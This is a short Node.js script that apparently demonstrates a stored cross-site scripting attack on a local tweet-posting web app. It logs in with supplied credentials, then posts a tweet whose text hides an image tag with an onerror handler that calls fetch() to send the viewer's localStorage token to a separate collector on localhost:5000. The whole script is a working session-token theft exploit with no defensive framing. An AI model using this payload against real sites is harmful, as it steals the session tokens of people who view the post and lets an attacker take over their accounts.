const axios = require('axios');
const jwt = require('jsonwebtoken');
const argv = require('optimist')
    .usage('Usage: $0 --email [test@mail.com] --password')
    .demand(['email', 'password']).argv;

const APP_URL = 'http://localhost:8081';

async function main({ email, password }) {
    const token = await createSession({ email, password });
    console.log('AUTH');
    await createTweet({ token });
    console.log('SAVED');
}

async function createSession({ email, password }) {
    const { data } = await axios.post(`${APP_URL}/api/v1/sessions`, {
        data : {
            email,
            password
        }
    });

    if (!data.status) {
        throw 'Create session error.';
    }

    return data.data.jwt;
}

async function createTweet({token}) {
    const exploitJS = "fetch('http://localhost:5000?token='+localStorage.getItem('token'))";
    const { data } = await axios.post(`${APP_URL}/api/v1/tweets?token=${token}`, {
        data : {
            "title"    : "Title",
            "subtitle" : "Subtitle",
            "text"     : `<span>Hello world2</span> <img style="display:none" src="WRONG" onerror="${exploitJS}" />`
        }
    });

    console.log(data);

    if (!data.status) throw 'Create document error.';

    return data.data;
}


main(argv).catch(e => {
    console.error(e);
});
